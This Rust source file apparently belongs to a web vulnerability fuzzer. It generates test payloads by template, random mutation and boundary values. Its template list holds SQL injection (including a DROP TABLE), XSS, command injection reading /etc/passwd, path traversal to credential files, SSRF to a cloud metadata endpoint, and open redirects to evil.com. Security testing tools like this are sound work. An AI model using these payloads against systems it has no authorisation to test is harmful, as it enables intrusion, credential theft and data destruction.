use crate::scheduler::VulnerabilityClassTarget;
use rand::Rng;

#[derive(Debug, Clone)]
pub struct MutatedPayload {
    pub raw: String,
    pub vulnerability_class: VulnerabilityClassTarget,
    pub mutation_strategy: MutationStrategy,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MutationStrategy {
    Template,
    Generative,
    BitFlip,
    Boundary,
}

impl std::fmt::Display for MutationStrategy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let label = match self {
            Self::Template => "template",
            Self::Generative => "generative",
            Self::BitFlip => "bitflip",
            Self::Boundary => "boundary",
        };
        write!(f, "{label}")
    }
}

pub struct PayloadMutator {
    templates: Vec<(VulnerabilityClassTarget, Vec<String>)>,
}

impl PayloadMutator {
    pub fn new() -> Self {
        Self {
            templates: build_default_templates(),
        }
    }

    pub fn generate_payloads(
        &self,
        class: VulnerabilityClassTarget,
        count: usize,
    ) -> Vec<MutatedPayload> {
        let mut payloads = Vec::new();

        let class_templates: Vec<&str> = self
            .templates
            .iter()
            .filter(|(c, _)| *c == class)
            .flat_map(|(_, t)| t.iter().map(|s| s.as_str()))
            .collect();

        for template in class_templates.iter().take(count) {
            payloads.push(MutatedPayload {
                raw: template.to_string(),
                vulnerability_class: class,
                mutation_strategy: MutationStrategy::Template,
            });
        }

        if payloads.len() < count {
            let remaining = count - payloads.len();
            for _ in 0..remaining {
                let base = if class_templates.is_empty() {
                    "FUZZ"
                } else {
                    class_templates[payloads.len() % class_templates.len()]
                };
                payloads.push(MutatedPayload {
                    raw: mutate_string(base),
                    vulnerability_class: class,
                    mutation_strategy: MutationStrategy::BitFlip,
                });
            }
        }

        payloads
    }

    pub fn generate_boundary_payloads(&self) -> Vec<MutatedPayload> {
        let boundaries: Vec<String> = vec![
            "".to_string(),
            " ".to_string(),
            "\0".to_string(),
            "\n".to_string(),
            "\r\n".to_string(),
            "A".repeat(1000),
            "A".repeat(10000),
            "-1".to_string(),
            "0".to_string(),
            "2147483647".to_string(),
            "-2147483648".to_string(),
            "9999999999999999999".to_string(),
            "null".to_string(),
            "undefined".to_string(),
            "true".to_string(),
            "false".to_string(),
            "[]".to_string(),
            "{}".to_string(),
            "NaN".to_string(),
            "Infinity".to_string(),
        ];

        boundaries
            .into_iter()
            .map(|raw| MutatedPayload {
                raw,
                vulnerability_class: VulnerabilityClassTarget::SqlInjection,
                mutation_strategy: MutationStrategy::Boundary,
            })
            .collect()
    }

    pub fn template_count(&self, class: VulnerabilityClassTarget) -> usize {
        self.templates
            .iter()
            .filter(|(c, _)| *c == class)
            .map(|(_, t)| t.len())
            .sum()
    }
}

impl Default for PayloadMutator {
    fn default() -> Self {
        Self::new()
    }
}

fn mutate_string(input: &str) -> String {
    let mut rng = rand::rng();
    let mut chars: Vec<char> = input.chars().collect();

    if chars.is_empty() {
        return "FUZZ".to_string();
    }

    let mutations = rng.random_range(1..=3);
    for _ in 0..mutations {
        let idx = rng.random_range(0..chars.len());
        let mutation_type = rng.random_range(0..3);
        match mutation_type {
            0 => chars[idx] = (rng.random_range(32u8..127u8)) as char,
            1 => chars.insert(idx, (rng.random_range(32u8..127u8)) as char),
            _ => {
                chars.remove(idx);
                if chars.is_empty() {
                    chars.push('X');
                }
            }
        }
    }

    chars.into_iter().collect()
}

fn build_default_templates() -> Vec<(VulnerabilityClassTarget, Vec<String>)> {
    vec![
        (
            VulnerabilityClassTarget::SqlInjection,
            vec![
                "' OR '1'='1".to_string(),
                "' OR '1'='1' --".to_string(),
                "'; DROP TABLE users; --".to_string(),
                "1 UNION SELECT null,null,null--".to_string(),
                "' AND 1=1--".to_string(),
                "1' ORDER BY 1--".to_string(),
                "' WAITFOR DELAY '0:0:5'--".to_string(),
                "1; SELECT pg_sleep(5)--".to_string(),
            ],
        ),
        (
            VulnerabilityClassTarget::CrossSiteScripting,
            vec![
                "<script>alert(1)</script>".to_string(),
                "<img src=x onerror=alert(1)>".to_string(),
                "<svg onload=alert(1)>".to_string(),
                "javascript:alert(1)".to_string(),
                "'\"><script>alert(1)</script>".to_string(),
                "<body onload=alert(1)>".to_string(),
            ],
        ),
        (
            VulnerabilityClassTarget::CommandInjection,
            vec![
                "; id".to_string(),
                "| id".to_string(),
                "$(id)".to_string(),
                "`id`".to_string(),
                "; cat /etc/passwd".to_string(),
                "& whoami".to_string(),
            ],
        ),
        (
            VulnerabilityClassTarget::PathTraversal,
            vec![
                "../../../etc/passwd".to_string(),
                "..\\..\\..\\windows\\system32\\config\\sam".to_string(),
                "....//....//....//etc/passwd".to_string(),
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string(),
                "/etc/passwd%00".to_string(),
            ],
        ),
        (
            VulnerabilityClassTarget::ServerSideRequestForgery,
            vec![
                "http://127.0.0.1".to_string(),
                "http://localhost".to_string(),
                "http://0.0.0.0".to_string(),
                "http://[::1]".to_string(),
                "http://169.254.169.254/latest/meta-data/".to_string(),
            ],
        ),
        (
            VulnerabilityClassTarget::ServerSideTemplateInjection,
            vec![
                "{{7*7}}".to_string(),
                "${7*7}".to_string(),
                "<%= 7*7 %>".to_string(),
                "#{7*7}".to_string(),
                "{{config}}".to_string(),
            ],
        ),
        (
            VulnerabilityClassTarget::HeaderInjection,
            vec![
                "value\r\nInjected-Header: true".to_string(),
                "value\nX-Injected: yes".to_string(),
            ],
        ),
        (
            VulnerabilityClassTarget::OpenRedirect,
            vec![
                "//evil.com".to_string(),
                "https://evil.com".to_string(),
                "/\\evil.com".to_string(),
                "//evil.com/%2f..".to_string(),
            ],
        ),
        (
            VulnerabilityClassTarget::CrlfInjection,
            vec![
                "%0d%0aSet-Cookie:evil=true".to_string(),
                "\r\nLocation: http://evil.com".to_string(),
            ],
        ),
        (
            VulnerabilityClassTarget::Deserialization,
            vec![
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==".to_string(),
                "O:8:\"stdClass\":0:{}".to_string(),
                "{\"__type\":\"System.Windows.Data.ObjectDataProvider\"}".to_string(),
            ],
        ),
    ]
}
